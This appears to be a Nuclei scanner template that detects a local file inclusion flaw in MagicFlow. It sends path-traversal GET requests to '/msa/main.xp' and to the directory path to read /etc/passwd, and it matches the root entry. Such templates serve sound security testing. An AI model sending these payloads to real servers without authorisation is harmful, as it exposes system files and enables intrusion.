id: magicflow-lfi
info:
  author: gy741
  description: A vulnerability in MagicFlow allows remote unauthenticated users to
    access locally stored files on the server and return their content via the '/msa/main.xp'
    endpoint and the 'Fun' parameter.
  name: MagicFlow - Local File Inclusion
  reference:
  - https://www.seebug.org/vuldb/ssvid-89258
  severity: critical
  tags: magicflow,lfi
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd'
  - '{{BaseURL}}/msa/../../../../../../../../etc/passwd'
